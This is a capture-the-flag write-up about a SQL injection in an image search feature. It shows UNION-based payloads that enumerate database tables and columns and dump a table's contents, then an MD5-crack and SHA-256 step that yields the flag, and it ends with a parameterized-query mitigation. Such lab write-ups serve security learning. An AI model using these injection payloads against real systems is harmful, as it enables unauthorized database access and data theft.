# Search image SQL injection

`1 or 1=1 UNION SELECT table_schema, table_name FROM information_schema.tables`
There is a `list_images` table on the database as well

>list_images -> hex = 0x6c6973745f696d61676573

`1 or 1=1 UNION SELECT NULL,group_concat(column_name) FROM information_schema.columns where table_name = 0x6c6973745f696d61676573`

We get the tables used for images:
>id,url,title,comment

`1 or 1=1 UNION SELECT NULL,group_concat(id,url,title,0x0a,comment) from list_images`

One of the comments is 
>If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46

>1928e8083cf461a51303633093573c46 MD5 decoded -> albatroz

>sha256 on albatroz -> f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188

Flag: f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188

# Mitigation

Do not blindly enter user input into hardcoded SQL statements. Instead use a library that sanitizes and prepares SQL statements for you using the parameters a user gives.